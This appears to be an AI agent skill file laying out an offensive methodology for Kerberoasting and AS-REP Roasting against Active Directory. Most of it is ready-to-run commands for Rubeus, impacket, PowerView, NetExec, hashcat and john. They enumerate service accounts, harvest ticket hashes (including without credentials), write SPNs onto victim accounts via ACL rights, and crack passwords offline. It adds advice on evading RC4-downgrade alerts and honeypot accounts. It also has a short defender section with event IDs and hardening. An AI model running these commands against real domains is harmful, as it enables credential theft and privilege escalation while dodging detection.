---
name: offensive-kerberoasting
description: "Kerberoasting and AS-REP Roasting skill for Active Directory credential-access assessments. Covers SPN discovery (setspn -Q, PowerView Get-DomainUser -SPN, impacket GetUserSPNs.py, raw LDAP queries, BloodHound/SharpHound), requesting TGS-REP service tickets (Rubeus kerberoast with /tgtdeleg /rc4opsec /aes /nowrap /stats, impacket), and targeted Kerberoasting by writing an SPN onto a controlled account via GenericWrite/GenericAll/WriteSPN then roasting. Includes AS-REP Roasting against DONT_REQ_PREAUTH accounts (Rubeus asreproast, GetNPUsers.py), offline cracking with hashcat (-m 13100 RC4 TGS-REP, -m 19600/19700 AES, -m 18200 AS-REP) and john, wordlist and rule strategy, RC4 (etype 0x17) vs AES (etype 0x12) encryption-type selection and downgrade OPSEC, honeypot/decoy SPN account awareness, and the defender view (event 4769 ticket encryption type, 4768, honeytoken alerts, gMSA, AES-only enforcement, strong service-account passwords). Use when you have any authenticated domain foothold (even a low-privilege user or just a valid username list) and want offline, password-cracking paths to service-account and user credentials without touching LSASS or a domain controller's disk, when escalating via a weak service account, or when assessing resistance to offline Kerberos ticket cracking."
---

# Kerberoasting & AS-REP Roasting — Offensive Testing Methodology

Kerberoasting abuses a design feature of Kerberos: any authenticated domain principal can request a service ticket (TGS-REP) for any account that has a Service Principal Name (SPN), and part of that ticket is encrypted with the service account's password-derived key. Request the ticket, extract the encrypted blob, and crack it offline — no elevated rights, no contact with the target service, no LSASS touch. AS-REP Roasting is the sibling attack: accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`) hand out an AS-REP blob encrypted with the user's password key to *anyone* who asks, so you don't even need credentials — a username is enough. Both are low-noise, high-yield credential-access techniques that convert weak service-account and user passwords into cleartext entirely offline.

## Quick Workflow

1. Enumerate SPN-bearing accounts (`setspn`, PowerView, `GetUserSPNs.py`, LDAP, BloodHound) and triage by privilege, password age, and `msDS-SupportedEncryptionTypes`
2. Enumerate accounts with `DONT_REQ_PREAUTH` for AS-REP Roasting (works with only a username list — no password needed)
3. Request TGS-REP tickets for the SPN targets and AS-REP blobs for pre-auth-disabled accounts, preferring RC4 where OPSEC allows
4. If you lack a juicy target, write an SPN onto an account you control via `GenericWrite`/`GenericAll`/`WriteSPN`, roast it, then clean up
5. Crack offline with hashcat/john using tuned wordlists and rules; validate recovered creds and map the escalation path
6. Document every ticket request timestamp and clean up any SPN you set

---

## SPN Discovery

Only accounts with an SPN are Kerberoastable. Computer accounts have SPNs too, but their passwords are 120-character machine-generated secrets — practically uncrackable. Focus on **user** accounts with SPNs (service accounts): these frequently have human-chosen, static, non-expiring passwords.

### Native Windows (no tooling drop)

```cmd
:: Query every SPN in the domain with the built-in tool
setspn -T example.com -Q */*

:: Query a specific account
setspn -L svc_sql
```

```powershell
# Pure .NET LDAP — no PowerView, no binary on disk
$search = New-Object DirectoryServices.DirectorySearcher
$search.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
$search.PageSize = 1000
$search.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset","memberof"))
$search.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties["samaccountname"][0]
        SPNs = $_.Properties["serviceprincipalname"] -join ", "
        PwdLastSet = [datetime]::FromFileTime($_.Properties["pwdlastset"][0])
    }
}
```

### PowerView

```powershell
# All SPN-bearing user accounts
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname,pwdlastset,memberof

# Triage: find SPN accounts that are also privileged (highest value)
Get-DomainUser -SPN -AdminCount | Select samaccountname,serviceprincipalname

# Check supported encryption types (0x1C=AES+RC4, 0x18=AES-only, 0x04/absent=RC4)
Get-DomainUser -SPN | Select samaccountname,'msds-supportedencryptiontypes'
```

### Impacket (from Linux, no Windows host)

```bash
# List SPN accounts without requesting tickets yet (recon only)
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10

# With a Kerberos ticket instead of a password
KRB5CCNAME=lowpriv.ccache impacket-GetUserSPNs -k -no-pass example.com/lowpriv -dc-ip 192.0.2.10
```

### Raw LDAP

```bash
# ldapsearch for userAccountControl-normal accounts carrying an SPN
ldapsearch -x -H ldap://192.0.2.10 -D "lowpriv@example.com" -w 'Password123' \
  -b "DC=example,DC=com" \
  "(&(objectCategory=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
  sAMAccountName servicePrincipalName pwdLastSet msDS-SupportedEncryptionTypes
```

### BloodHound

```cypher
// Kerberoastable users already collected by SharpHound
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// Highest-value: Kerberoastable users with a path to Domain Admins
MATCH (u:User {hasspn:true}), (g:Group)
WHERE g.name STARTS WITH "DOMAIN ADMINS"
MATCH p = shortestPath((u)-[*1..]->(g))
RETURN u.name, length(p) ORDER BY length(p)
```

SharpHound marks these with the `hasspn` property; BloodHound's **Kerberoastable Users** pre-built query surfaces them directly. Prioritize accounts that are members of privileged groups or have an outbound control edge toward Tier 0.

---

## Requesting Service Tickets (Kerberoasting)

### Rubeus (Windows, most control)

```powershell
# Roast every SPN account and dump hashes without line-wrapping (critical for cracking)
Rubeus.exe kerberoast /nowrap /outfile:tgs.txt

# OPSEC-aware: only roast accounts that support RC4, skipping AES-only accounts that
# would force an audit-visible downgrade, and use /tgtdeleg to derive the request
# from your own TGT (no explicit TGS requests that stand out)
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap /outfile:tgs.txt

# Show stats first (encryption types, account count) before touching anything loud
Rubeus.exe kerberoast /stats

# Target a single account (used in targeted/decoy-avoidance scenarios)
Rubeus.exe kerberoast /user:svc_sql /nowrap

# Explicitly request AES tickets (harder to crack but avoids RC4 downgrade alerts)
Rubeus.exe kerberoast /aes /nowrap /outfile:tgs_aes.txt

# Filter by password-last-set / admincount to prioritize stale, privileged accounts
Rubeus.exe kerberoast /pwdsetbefore:01-01-2022 /nowrap
```

`/tgtdeleg` uses the Kerberos GSS-API delegation trick to extract a usable TGT from the current logon session, then requests service tickets with the RC4 etype where supported — this avoids sending your plaintext credentials and lets you force RC4 even on dual-etype accounts. `/rc4opsec` combines with `/tgtdeleg` to only roast accounts where RC4 is natively supported, so you never trigger the "encryption downgrade" signal on AES-only accounts.

### Impacket (Linux)

```bash
# Request TGS for every SPN account and print crackable hashes
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10 -request

# Target a single account
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10 \
  -request-user svc_sql -outputfile tgs.txt

# Pass-the-ticket / pass-the-hash instead of a plaintext password
impacket-GetUserSPNs -k -no-pass example.com/lowpriv -dc-ip 192.0.2.10 -request
impacket-GetUserSPNs -hashes :<NThash> example.com/lowpriv -dc-ip 192.0.2.10 -request

# Force a specific supported encryption type (RC4 produces -m 13100 hashes)
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10 -request \
  -request-user svc_sql
```

### NetExec

```bash
# One-liner enumeration + roasting across a whole engagement
nxc ldap 192.0.2.10 -u lowpriv -p 'Password123' --kerberoasting kerb.out

# AS-REP roasting in the same tool (see below)
nxc ldap 192.0.2.10 -u lowpriv -p 'Password123' --asreproast asrep.out
```

### What a TGS-REP hash looks like

```
$krb5tgs$23$*svc_sql$EXAMPLE.COM$example.com/svc_sql*$<16-byte-checksum>$<encrypted-ticket-blob>...
```

The `$23$` is the etype (23 = 0x17 = RC4-HMAC → hashcat `-m 13100`). `$17$`/`$18$` indicate AES128/AES256 (hashcat `-m 19600`/`-m 19700`). Keep the hash on a single line; a wrapped blob will not crack.

---

## Targeted Kerberoasting (write an SPN, then roast)

If you hold `GenericWrite`, `GenericAll`, or the specific `WriteSPN` (`Validated-SPN`) right over a victim user that has no SPN, you can write a fake SPN onto it, roast it, and remove the SPN. This converts an ACL edge into an offline crack of that user's password. BloodHound renders this as the **AddSPN**/targeted-kerberoast abuse on a user node.

### PowerView + Rubeus

```powershell
# 1. Confirm you have the right (WriteSPN / GenericWrite / GenericAll)
Get-DomainObjectAcl -Identity victimuser -ResolveGUIDs |
  ?{ $_.SecurityIdentifier -eq (Get-DomainUser lowpriv).objectsid }

# 2. Write an arbitrary (syntactically valid, unused) SPN
Set-DomainObject -Identity victimuser -Set @{serviceprincipalname='fake/WIN-KRB'}

# 3. Roast it
Rubeus.exe kerberoast /user:victimuser /nowrap /outfile:targeted.txt

# 4. CLEAN UP — remove the SPN you added so you don't leave artifacts
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

### PowerMad / AD module variant

```powershell
# Using the ActiveDirectory module if PowerView is unavailable
Set-ADUser -Identity victimuser -ServicePrincipalNames @{Add='fake/WIN-KRB'}
Rubeus.exe kerberoast /user:victimuser /nowrap
Set-ADUser -Identity victimuser -ServicePrincipalNames @{Remove='fake/WIN-KRB'}
```

### Impacket targetedKerberoast (end-to-end from Linux)

```bash
# Automatically finds writable users, sets an SPN, roasts, and reverts
python3 targetedKerberoast.py -v -d example.com -u lowpriv -p 'Password123' \
  --dc-ip 192.0.2.10
```

Always clear the SPN afterward. A lingering `fake/*` SPN on a user account is a glaring indicator and will out-live your engagement.

---

## AS-REP Roasting

Accounts with **"Do not require Kerberos preauthentication"** (`userAccountControl` flag `DONT_REQ_PREAUTH`, 0x400000) will return an AS-REP whose encrypted portion is derived from the user's password — to any requester. You need **no credentials**, only a valid username, making this ideal immediately after username enumeration.

### Enumerate pre-auth-disabled accounts

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select samaccountname,useraccountcontrol

# Raw LDAP bit filter (0x400000 = 4194304)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
```

### Rubeus

```powershell
# Roast all pre-auth-disabled accounts in the domain
Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt

# Target one account
Rubeus.exe asreproast /user:svc_legacy /format:hashcat /nowrap
```

### Impacket GetNPUsers (credential-less when you have a user list)

```bash
# No password needed — just a username list (great right after user enum)
impacket-GetNPUsers example.com/ -usersfile users.txt -no-pass -dc-ip 192.0.2.10 \
  -format hashcat -outputfile asrep.txt

# If you already have low-priv creds, enumerate + roast in one pass
impacket-GetNPUsers example.com/lowpriv:'Password123' -request -dc-ip 192.0.2.10 \
  -format hashcat -outputfile asrep.txt
```

### What an AS-REP hash looks like

```
$krb5asrep$23$svc_legacy@EXAMPLE.COM:<checksum>$<encrypted-blob>...
```

`$23$` is RC4 (hashcat `-m 18200`). AS-REP with AES is rare in the wild; RC4 is the default here.

---

## Offline Cracking

The entire value of roasting is realized offline. Nothing in this phase touches the target network, so crack aggressively.

### hashcat modes

| Hash type | Encryption | hashcat mode | Notes |
|-----------|-----------|-------------|-------|
| TGS-REP (Kerberoast) | RC4-HMAC (etype 23 / 0x17) | `-m 13100` | Fastest to crack; most common |
| TGS-REP (Kerberoast) | AES128-CTS (etype 17 / 0x11) | `-m 19600` | Much slower; AES-only targets |
| TGS-REP (Kerberoast) | AES256-CTS (etype 18 / 0x12) | `-m 19700` | Slowest; strong accounts |
| AS-REP Roast | RC4-HMAC (etype 23 / 0x17) | `-m 18200` | Credential-less harvest |

```bash
# RC4 Kerberoast — straight wordlist
hashcat -m 13100 tgs.txt rockyou.txt

# RC4 Kerberoast with a strong rule set (recommended default)
hashcat -m 13100 tgs.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule -O -w 4

# AES256 Kerberoast (slow — reserve GPU time, narrow the wordlist)
hashcat -m 19700 tgs_aes.txt custom-corp-wordlist.txt -r rules/best64.rule

# AS-REP Roast
hashcat -m 18200 asrep.txt rockyou.txt -r rules/dive.rule

# Show cracked results
hashcat -m 13100 tgs.txt --show
```

### john the ripper

```bash
# Kerberoast (john auto-detects krb5tgs)
john --format=krb5tgs --wordlist=rockyou.txt tgs.txt
john --format=krb5tgs tgs.txt --show

# AS-REP roast
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt
```

### Wordlist and rule strategy

- Start with `rockyou.txt` + a heavy rule set (`OneRuleToRuleThemAll`, `dive`) for breadth.
- Build a **targeted corporate wordlist**: company name, product names, seasons+years (`Spring2025!`), the domain name, and terms harvested from BloodHound/SharpShares. Service accounts are frequently named after the app (`svc_sql`, `backupadmin`) and their passwords often echo it.
- Use CeWL against the corporate site to scrape a domain-specific wordlist, then apply rules.
- Service accounts are usually exempt from password-expiry policy, so old, weak passwords survive for years — prioritize accounts with ancient `pwdLastSet`.
- RC4 hashes (`-m 13100`/`-m 18200`) crack an order of magnitude faster than AES; always collect RC4 where OPSEC permits.

---

## RC4 vs AES Encryption-Type Selection & Downgrade OPSEC

The encryption type of the ticket you receive dictates crack speed *and* detection risk.

| etype | Value | hashcat | Crack speed | Detection profile |
|-------|-------|---------|-------------|-------------------|
| RC4-HMAC | 23 / 0x17 | `-m 13100` | Fast | **Loud** — RC4 TGS in an AES environment is a classic roast signal |
| AES128 | 17 / 0x11 | `-m 19600` | Slow | Quiet — normal in modern domains |
| AES256 | 18 / 0x12 | `-m 19700` | Slowest | Quiet — normal in modern domains |

- Defenders increasingly alert on **event 4769 where `Ticket Encryption Type = 0x17`** for accounts that otherwise negotiate AES. Requesting RC4 against an AES-capable account is the single most common Kerberoast detection.
- `Rubeus kerberoast /tgtdeleg` forces RC4 because the AP exchange it emulates advertises RC4 — handy for crackability, but it *is* the downgrade behavior defenders hunt. Use `/rc4opsec` to restrict RC4 requests to accounts that only support RC4 anyway (no downgrade, no signal).
- Against AES-only accounts, either accept the slow AES crack (`-m 19600`/`-m 19700`) with a tight wordlist, or deprioritize them entirely.
- If you only need *proof* of weak passwords and not stealth, roast everything with RC4 and note the detection trade-off in your report.

---

## Honey / Decoy SPN Accounts

Mature defenders plant **honeypot service accounts**: a user object with an enticing SPN (`svc_backup`, `sql_admin`), a long random password that will never crack, `AdminCount=1` to look privileged, and an alert wired to any 4769 request for its SPN. Requesting its ticket is often the first thing that burns an engagement.

Before roasting indiscriminately, triage for decoys:

```powershell
# Red flags for a honeypot account:
#  - recently created but "privileged" (check whenCreated vs adminCount)
#  - zero logon activity (lastLogon / logonCount = 0)
#  - a description or SPN that is a little too tempting
Get-DomainUser -SPN | Select samaccountname,whencreated,lastlogon,logoncount,admincount,description
```

- An account with `logonCount` of 0 or 1 and a brand-new `whenCreated` but privileged-looking attributes is very likely a decoy — skip it.
- Prefer accounts with real, recent logon history and old `pwdLastSet`: those are genuine, in-use service accounts with stale passwords.
- `Rubeus kerberoast /stats` and a careful BloodHound review let you choose targets deliberately instead of spraying every SPN.

---

## Detection / Defender View

| Signal | Event / Source | What it shows |
|--------|---------------|---------------|
| Service ticket request | **4769** (Kerberos Service Ticket Operations) | SPN requested, requesting account, client IP, `Ticket Encryption Type` |
| RC4 downgrade | 4769 with `Ticket Encryption Type = 0x17` | RC4 ticket where AES expected — prime Kerberoast indicator |
| AS-REQ without pre-auth | **4768** (Kerberos Authentication Ticket) with `Pre-Authentication Type = 0` | AS-REP roasting of a `DONT_REQ_PREAUTH` account |
| Volume anomaly | Many 4769s from one host in a short window | Bulk roasting (`Rubeus kerberoast`, `GetUserSPNs -request`) |
| Honeytoken hit | 4769 for a decoy SPN | Any request = high-fidelity intrusion alert |
| SPN modification | **5136** (directory object modified) on `servicePrincipalName` | Targeted Kerberoasting setup (and cleanup) |

**Hunting query (splunk-style):**

```spl
index=wineventlog EventCode=4769
| where Ticket_Encryption_Type="0x17"
| stats count dc(Service_Name) as distinct_spns by Account_Name, src_ip
| where distinct_spns > 5 OR count > 10
```

**What hardens the environment (and what you should expect to run into):**

- **Group Managed Service Accounts (gMSA/dMSA):** 120+ character, auto-rotated passwords — effectively uncrackable. Enumerate them (`Get-ADServiceAccount -Filter *`) but don't waste GPU on them.
- **AES-only enforcement:** `msDS-SupportedEncryptionTypes = 0x18` removes the RC4 fast path.
- **Strong, long, rotated service-account passwords:** 25+ random characters defeat offline cracking regardless of etype.
- **Removing unnecessary SPNs** and converting interactive service accounts to gMSA.
- **Honeytoken accounts** wired to 4769 alerts (see above).
- **Disabling `DONT_REQ_PREAUTH`** everywhere it isn't strictly required kills AS-REP roasting.

---

## Engagement Cheatsheet

```bash
# 0. (No creds) AS-REP roast from a username list — zero authentication required
impacket-GetNPUsers example.com/ -usersfile users.txt -no-pass -dc-ip 192.0.2.10 \
  -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule

# 1. (Low-priv creds) Enumerate SPN accounts, triage for honeypots
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10

# 2. Roast real service accounts (RC4 where it won't trigger a downgrade alert)
impacket-GetUserSPNs example.com/lowpriv:'Password123' -dc-ip 192.0.2.10 -request \
  -outputfile tgs.txt
# Windows equivalent with best OPSEC:
# Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap /outfile:tgs.txt

# 3. Crack offline
hashcat -m 13100 tgs.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule -O -w 4
hashcat -m 13100 tgs.txt --show

# 4. (ACL edge, no juicy SPN) Targeted kerberoast then clean up
#   Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/WIN-KRB'}
#   Rubeus.exe kerberoast /user:victim /nowrap
#   Set-DomainObject -Identity victim -Clear serviceprincipalname

# 5. Validate cracked service-account creds and map the escalation
nxc smb 192.0.2.10 -u svc_sql -p '<cracked>' --shares
```

---

## Key References

- MITRE ATT&CK: [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- MITRE ATT&CK: [T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- MITRE ATT&CK: T1558 (Steal or Forge Kerberos Tickets), TA0006 (Credential Access)
- Tim Medin — original Kerberoasting research, "Attacking Kerberos: Kicking the Guard Dog of Hades" (DerbyCon 2014): https://www.youtube.com/watch?v=PUyhlN-E5MU
- Rubeus (GhostPack) — roasting, `/tgtdeleg`, `/rc4opsec`, `/stats`: https://github.com/GhostPack/Rubeus
- Impacket GetUserSPNs.py / GetNPUsers.py: https://github.com/fortra/impacket
- PowerView (`Get-DomainUser -SPN`, `Set-DomainObject`): https://github.com/PowerShellMafia/PowerSploit
- targetedKerberoast.py: https://github.com/ShutdownRepo/targetedKerberoast
- BloodHound Kerberoastable Users query: https://bloodhound.specterops.io
- hashcat modes 13100 / 18200 / 19600 / 19700: https://hashcat.net/wiki/doku.php?id=example_hashes
- Harmj0y, "Kerberoasting Revisited": https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/active-directory.md
